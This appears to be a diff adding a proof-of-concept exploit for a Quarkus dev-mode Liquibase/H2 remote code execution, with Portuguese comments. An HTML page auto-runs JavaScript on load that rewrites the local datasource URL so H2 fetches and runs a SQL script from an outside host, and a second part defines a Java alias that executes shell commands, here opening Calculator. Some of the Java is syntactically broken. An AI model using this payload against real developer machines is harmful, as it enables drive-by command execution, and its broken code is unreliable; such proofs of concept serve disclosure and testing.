@@ -1,0 +1,48 @@
+<html>
+<head>
+   </head>
+   <body onload="execQuark()">
+   isso contém a carga para o Quarkus liquibase H2 RCE. Se tudo correr bem, você verá o aplicativo da calculadora aberto.
+   </body>
+   
+   <script>
+   function execQuark() {
+   
+     var xhr = new XMLHttpRequest();
+     xhr.addEventListener("readystatechange", function() {
+      if(this.readyState === 4) {
+        console.log(this.responseText);
+        
+       }
+      });
+      
+      xhr.open("POST", "http://localhost:8080/q/dev/io.quarkus.quarkus-vertx-http/config");
+      xhr.onprogress = function () {
+        console.log('LOADING: ', xhr.status);
+      };
+      
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("action=updateProperty&name=quarkus.datasource.jdbc.url&"
+      +"value=jdbc%3Ah2%3Amem%3Atestdb%3BINIT%3Drunscript+from+'http%3A%2F%2Fsomerandomsite.bla%3A8081%2Fexec.sql'");
+      
+ 
+ 
+ }
+ </script>
+ 
+ </html>
+
+     
+  __________________________________#########################__________________________________
+  
+  
+  CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+  
+     java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime9).exec(cmd).getInputStream()).useDelimiter("\\A");
+     return s.hasNext() ? s.next() : "";  }
+     
+     $$;
+     
+        CALL SHELLEXEC('open /System/Applications/Calculator.app/')'
+        
+  
